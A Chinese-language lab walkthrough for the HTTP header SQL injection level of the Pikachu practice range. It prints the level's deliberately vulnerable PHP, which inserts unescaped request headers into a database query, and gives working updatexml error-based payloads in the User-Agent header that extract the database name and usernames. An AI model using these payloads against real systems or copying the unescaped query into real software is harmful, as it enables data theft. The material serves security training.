# http头注入

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "sqli_header.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}

$PIKA_ROOT_DIR =  "../../../";
include_once $PIKA_ROOT_DIR . 'header.php';

include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";


$link=connect();

$is_login_id=check_sqli_login($link);
if(!$is_login_id){
    header("location:sqli_header_login.php");
}
// $remoteipadd=escape($link, $_SERVER['REMOTE_ADDR']);
// $useragent=escape($link, $_SERVER['HTTP_USER_AGENT']);
// $httpaccept=escape($link, $_SERVER['HTTP_ACCEPT']);
// $httpreferer=escape($link, $_SERVER['HTTP_REFERER']);


//直接获取前端过来的头信息,没人任何处理,留下安全隐患
$remoteipadd=$_SERVER['REMOTE_ADDR'];
$useragent=$_SERVER['HTTP_USER_AGENT'];
$httpaccept=$_SERVER['HTTP_ACCEPT'];
$remoteport=$_SERVER['REMOTE_PORT'];

//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞
$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";
$result=execute($link, $query);


if(isset($_GET['logout']) && $_GET['logout'] == 1){
    setcookie('ant[uname]','',time()-3600);
    setcookie('ant[pw]','',time()-3600);
    header("location:sqli_header_login.php");
}


?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="../sqli.php">sqli</a>
                </li>
                <li class="active">http头注入</li>
            </ul><!-- /.breadcrumb -->
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
                   data-content="这里的问题挺多的,跟http头里面有关的字段都可以测试一下">
                点一下提示~
            </a>


        </div>
        <div class="page-content">

            <?php
            $html=<<<A
<div id="http_main">
    <h1>朋友，你好，你的信息已经被记录了：<a href="sqli_header.php?logout=1">点击退出</a></h1>
    <p>你的ip地址:$remoteipadd</p>
    <p>你的user agent:$useragent</p>
    <p>你的http accept:$httpaccept</p>
    <p>你的端口（本次连接）:tcp$remoteport</p>
</div>
A;
            echo $html;
            ?>




        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

通过观察源码可以得到该关卡对sql注入无任何防护

***

# 二、通关教程

使用题目提供的用户名密码(admin|123456)登录后可以看到该页面将http header信息记录了下来

根据页面信息可以猜出大概的SQL语句

```
insert 表名(字段1,字段2,字段3，字段4) values(数据1,数据2,数据3,数据4);
```

可以通过修改http头部信息中的User-Agent与Accept字段来实现SQL注入，使用到的方法与insert注入类似

猜数据库名

```
User-Agent: ' or updatexml(1,concat('~',(select database()),'~'),1) or '

# SQL语句如下
mysql> insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('1' or updatexml(1,concat('~',(select database()),'~'),1) or '');
ERROR 1105 (HY000): XPATH syntax error: '~pikachu~'
```

![image-20230306181041752](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230306181041752.png)

猜字段内容

```
User-Agent: x' or updatexml(1,concat('~',(select username from users limit 0,1),'~'),1) or '
```

![image-20230306181304882](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230306181304882.png)
